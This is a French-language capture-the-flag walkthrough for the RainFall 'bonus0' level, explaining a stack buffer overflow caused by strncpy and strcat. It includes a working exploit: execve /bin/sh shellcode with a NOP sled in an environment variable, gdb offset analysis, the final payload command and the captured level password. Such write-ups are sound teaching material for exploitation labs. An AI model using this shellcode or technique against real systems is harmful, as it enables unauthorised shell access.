# bonus0: Exploitation d'un Dépassement de Tampon

## Présentation du Défi

Le programme `bonus0` est vulnérable à un dépassement de tampon (_buffer overflow_) en raison d'une gestion incorrecte des entrées utilisateur. L'objectif est d'exploiter cette vulnérabilité pour accéder au compte utilisateur `bonus1`.

## Analyse du Code Source

```c
#include <stdio.h>
#include <string.h>
#include <unistd.h>

// Prototypes des fonctions
void p(char *buffer, char *prompt);
void pp(char *dest);

int main(void)
{
  char buffer[54];  // Tampon principal de 54 octets
  
  pp(buffer);
  puts(buffer);
  return 0;
}

void pp(char *dest)
{
  char first_input[20];   // Premier tampon d'entrée (20 octets)
  char second_input[20];  // Second tampon d'entrée (20 octets)
  // ...autres variables...
  
  p(first_input, " - ");   // Récupère la première entrée
  p(second_input, " - ");  // Récupère la seconde entrée
  
  strcpy(dest, first_input);  // Copie la première entrée dans dest (sans vérification de taille)
  
  // ...code pour trouver la fin de la chaîne et ajouter un espace...
  
  strcat(dest, second_input);  // Ajoute la seconde entrée (sans vérification de taille)
  return;
}

void p(char *buffer, char *prompt)
{
  char *newline_ptr;
  char input_buffer[4104];  // Grand tampon pour la lecture
  
  puts(prompt);
  read(0, input_buffer, 4096);  // Lit jusqu'à 4096 octets depuis stdin
  newline_ptr = strchr(input_buffer, '\n');
  *newline_ptr = '\0';
  strncpy(buffer, input_buffer, 20);  // Copie au maximum 20 octets dans le tampon
  return;
}
```

Le programme suit ce flux d'exécution:

1. `main()` alloue un tampon de 54 octets et appelle `pp()`
2. `pp()` appelle `p()` deux fois pour obtenir deux entrées de 20 octets
3. `pp()` concatène ces entrées dans le tampon de `main()`
4. `main()` affiche le tampon combiné

## Analyse de la Vulnérabilité

La vulnérabilité dans ce programme repose sur plusieurs problèmes clés:

1. **Opérations sur les chaînes sans vérification de limites**:

   ```c
   // Dans pp():
   strcpy(dest, first_input);  // Pas de vérification des limites
   strcat(dest, second_input);  // Pas de vérification des limites
   ```

   Ces fonctions ne vérifient pas si le tampon de destination est suffisamment grand.

2. **Comportement de strncpy()**:

   ```c
   // Dans p():
   strncpy(buffer, input_buffer, 20);  // Ne garantit pas la terminaison par un caractère nul
   ```

   Lorsque l'entrée est supérieure à 20 octets, `strncpy()` n'ajoute pas de caractère nul de terminaison. Cela signifie que si l'entrée est ≥ 20 octets, le tampon contiendra 20 octets sans caractère nul de fin.

3. **Vulnérabilité dans l'organisation de la pile (stack)**:
   Bien que le tampon dans `main()` soit de 54 octets, le problème critique n'est pas que les entrées combinées dépassent cette taille. La vulnérabilité réside dans la façon dont la pile est organisée. L'adresse de retour de `main()` est stockée à une distance fixe du tampon, et en débordant le tampon avec une entrée précisément construite, nous pouvons écraser cette adresse de retour.

Ces vulnérabilités permettent à un attaquant d'écraser précisément l'adresse de retour de `main()` avec l'adresse de son shellcode.

## Stratégie d'Exploitation

Pour exploiter cette vulnérabilité, nous devons:

1. **Placer le Shellcode**: Stocker notre shellcode dans une variable d'environnement puisque la limitation de 20 octets pour chaque entrée est trop petite pour un shellcode complet.

2. **Préparer une Entrée en Deux Parties**:
   - Première entrée: Remplir le tampon avec des caractères pour atteindre la limite de 20 octets
   - Seconde entrée: Positionner l'adresse du shellcode au bon offset
   
3. **Écraser l'Adresse de Retour**: Lorsque le programme combine ces entrées, elles déborderont le tampon de `main()` et écraseront son adresse de retour avec notre adresse de shellcode.

4. **Exécuter le Shellcode**: Lorsque `main()` retourne, il sautera vers notre shellcode dans la variable d'environnement, nous donnant ainsi un shell.

## Défis Rencontrés

### Défi 1: Gestion des Entrées en Deux Parties

Le programme attend deux entrées séparées, mais nos tests ont révélé des problèmes:

```bash
(python -c 'print "AAAA"'; python -c 'print "BBBB"') | ./bonus0
```

Cette approche a échoué car `read()` consommait les deux entrées d'un coup pour la première invite. Pour résoudre ce problème, nous avons dû déborder le tampon de `read()` d'une manière spécifique:

```c
  read(0, input_buffer, 4096);  // Lit jusqu'à 4096 octets depuis stdin
```

```bash
python -c "print 'A'*4095 + '\n' + 'second_input'" > /tmp/payload
```

Cela crée un fichier où la première entrée fait 4096 octets (la limite fixée pour `read()`), forçant le programme à effectuer un second appel à `read()` pour la seconde entrée.

### Défi 2: Limitation de la Taille du Shellcode

La fonction `p()` ne copie que 20 octets de notre entrée:

```c
strncpy(buffer, input_buffer, 20);
```

Notre shellcode fait 21+ octets, ce qui rend impossible de le loger dans cette limitation. Nous avons résolu ce problème en utilisant une variable d'environnement:

```bash
SHELLCODE=$(python -c 'print "\x90"*50 + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"')
# Création d'un "NOP sled" suivi du shellcode
# Le NOP sled (octets 0x90) crée une "zone d'atterrissage" qui augmente nos chances 
# d'exécuter le shellcode avec succès même si notre adresse est légèrement imprécise
# Consultez le walkthrough du niveau 2 pour plus de détails sur le shellcode
```

### Défi 3: Cohérence de l'Adresse de la Variable d'Environnement

Les variables d'environnement peuvent avoir différentes adresses d'une exécution à l'autre, rendant l'exploitation peu fiable. Nous avons créé un programme auxiliaire pour trouver l'adresse:

```c
#include <stdio.h>
#include <stdlib.h>

int main() {
    char *addr = getenv("SHELLCODE");
    if (addr) {
        printf("SHELLCODE address: %p\n", addr);
    } else {
        printf("SHELLCODE not found\n");
    }
    return 0;
}
```

L'élément critique était d'utiliser `env -i` pour créer un environnement propre, rendant l'adresse plus constante:

```bash
env -i SHELLCODE=$SHELLCODE /tmp/get_shellcode_addr
SHELLCODE address: 0xbfffffa8
```

### Défi 4: Détermination du Bon Offset et de la Taille Minimale d'Entrée

Pour déterminer précisément quels octets de notre entrée écrasent l'adresse de retour, nous avons créé une entrée de test avec un motif reconnaissable:

```bash
bonus0@RainFall:~$ python -c "print 'A'*4095 + '\n' + 'BCDEFGHIJKLMNOPQRSTU'" > /tmp/find_offset
bonus0@RainFall:~$ gdb ./bonus0

(gdb) break *main+39 # Point d'arrêt à la fin de main, juste avant le retour
Breakpoint 1 at 0x80485cb

(gdb) run < /tmp/find_offset
Starting program: /home/user/bonus0/bonus0 < /tmp/find_offset
 -
 -
AAAAAAAAAAAAAAAAAAAABCDEFGHIJKLMNOPQRSTU��� BCDEFGHIJKLMNOPQRSTU���

Breakpoint 1, 0x080485cb in main ()
(gdb) x/64wx $esp-100
0xbffff5a8:     0x00000001      0x0804835d      0xb7fd13e4      0x41410000
0xbffff5b8:     0x41414141      0x41414141      0x41414141      0x41414141 # Les 41 correspondent aux 'A'
0xbffff5c8:     0x43424141      0x47464544      0x4b4a4948      0x4f4e4d4c # 42 à 4f correspondent à 'BCDEFGHIJKLMNOPQRSTU'
0xbffff5d8:     0x53525150      0x0ff45554      0x4220b7fd      0x46454443
0xbffff5e8:     0x4a494847      0x4e4d4c4b      0x5251504f      0xf4555453
0xbffff5f8:     0x00b7fd0f      0xb7fdc858      0x00000000      0xbffff61c
```

Et en vérifiant quelle partie de notre entrée écrase l'EIP sauvegardé:

```
(gdb) info frame
Stack level 0, frame at 0xbffff5f0:
 eip = 0x80485cb in main; saved eip 0x4e4d4c4b
 Saved registers:
  eip at 0xbffff5ec
```

Cela révèle que l'adresse de retour sauvegardée (`0xbffff5ec`) contient `0x4e4d4c4b`, qui correspond aux caractères 'KLMN' dans notre seconde entrée. En examinant notre motif:

```
Seconde entrée: 'BCDEFGHIJKLMNOPQRSTU'
                          ^^^^
                          |
                          +-- Ces caractères (KLMN) écrasent EIP
```

Cela confirme que les caractères aux positions 10-13 dans notre seconde entrée écrasent l'adresse de retour. Par conséquent, nous avons besoin de:

- 9 octets de bourrage (padding)
- 4 octets pour notre adresse de shellcode
- Des octets de bourrage supplémentaires pour assurer une exécution fiable

À travers des tests supplémentaires, nous avons découvert une exigence additionnelle: la seconde entrée doit faire au moins 20 octets au total (incluant nos 9 octets de bourrage, l'adresse de 4 octets, et au moins 7 octets supplémentaires) pour que l'exploit fonctionne de façon fiable.

```bash
# Celui-ci a échoué (seulement 6 octets de bourrage après l'adresse)
python -c "print 'B'*4095 + '\n' + 'A'*9 + '\xa8\xff\xff\xbf' + 'A'*6" > /tmp/myexploit

# Celui-ci a fonctionné (7 octets de bourrage après l'adresse)
python -c "print 'B'*4095 + '\n' + 'A'*9 + '\xa8\xff\xff\xbf' + 'A'*7" > /tmp/myexploit
```

Cette approche basée sur un motif nous donne une compréhension précise de comment positionner notre adresse de shellcode pour contrôler de manière fiable l'exécution du programme.

## Exploit Final

En rassemblant tous les éléments:

```bash
# Configuration du shellcode dans une variable d'environnement
SHELLCODE=$(python -c 'print "\x90"*50 + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"')

# Trouver l'adresse du shellcode dans un environnement propre
env -i SHELLCODE=$SHELLCODE /tmp/get_shellcode_addr
# SHELLCODE address: 0xbfffffa8

# Créer l'entrée d'exploit avec au moins 20 octets pour la seconde entrée (9+4+7=20)
python -c "print 'A'*4095 + '\n' + 'B'*9 + '\xa8\xff\xff\xbf' + 'C'*7" > /tmp/payload

# Exécuter l'exploit
(cat /tmp/payload; cat) | env -i SHELLCODE=$SHELLCODE ./bonus0
```

## Récupération du Mot de Passe

Après avoir exécuté l'exploit, nous avons obtenu un accès au compte utilisateur `bonus1` et récupéré le mot de passe:

```bash
cat /home/user/bonus1/.pass
cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9
```

## Passage au Niveau Suivant

Utilisez ce mot de passe pour vous connecter en tant que `bonus1` et passez au défi suivant.
